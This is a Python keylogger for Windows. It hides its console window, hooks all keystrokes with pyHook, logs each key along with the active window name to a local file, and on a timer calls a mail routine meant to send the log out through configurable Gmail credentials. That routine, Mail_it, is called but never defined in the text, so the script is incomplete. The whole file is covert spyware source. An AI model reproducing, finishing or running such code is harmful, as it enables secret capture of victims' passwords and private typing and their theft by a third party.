
import sys
import win32api,pythoncom
import pyHook,os,time,random,smtplib,string,base64
t="";pics_names=[]



yourgmail=""                                        
yourgmailpass=""                                   
sendto=""                                           
interval=60                                        


try:

    f = open('Logfile.txt', 'a')
    f.close()
except:

    f = open('Logfile.txt', 'w')
    f.close()


def Hide():
    import win32console
    import win32gui
    win = win32console.GetConsoleWindow()
    win32gui.ShowWindow(win, 0)

Hide()

def OnKeyboardEvent(event):
    global yourgmail, yourgmailpass, sendto, interval
    data = '\n[' + str(time.ctime().split(' ')[3]) + ']' \
        + ' WindowName : ' + str(event.WindowName)
    data += '\n\tKeyboard key :' + str(event.Key)
    data += '\n===================='
    global t, start_time
    t = t + data

    if len(t) > 500:
        f = open('Logfile.txt', 'a')
        f.write(t)
        f.close()
        t = ''

    if int(time.time() - start_time) == int(interval):
        Mail_it(t, pics_names)
        t = ''

    return True

hook = pyHook.HookManager()

hook.KeyDown = OnKeyboardEvent

hook.HookKeyboard()

start_time = time.time()

pythoncom.PumpMessages()
